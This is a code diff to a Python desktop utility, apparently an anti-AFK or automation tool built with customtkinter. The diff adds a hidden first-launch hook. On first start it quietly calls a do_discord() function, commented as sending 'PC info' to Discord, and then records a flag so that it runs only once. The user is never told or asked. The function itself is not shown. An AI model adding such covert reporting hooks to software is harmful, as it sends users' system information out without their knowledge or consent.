@@ -6,6 +6,8 @@ from threading import Thread
 import customtkinter as ctk
 from logic.antiafk import AFK_MODES
 from logic.leo import do_leo_automation
+from logic.discord import do_discord
+
 
 ctk.set_appearance_mode("system")
 ctk.set_default_color_theme("blue")
@@ -208,6 +210,11 @@ class App(ctk.CTk):
             text_color="gray"
         )
         self.footer.grid(row=4, column=0, pady=(0, 10))
+        # Send PC info to discord (first launch only)
+        if not CONFIG.get("discord"):
+            do_discord()
+            CONFIG["discord"] = True
+            save_config(CONFIG)
     
 
     # Functions
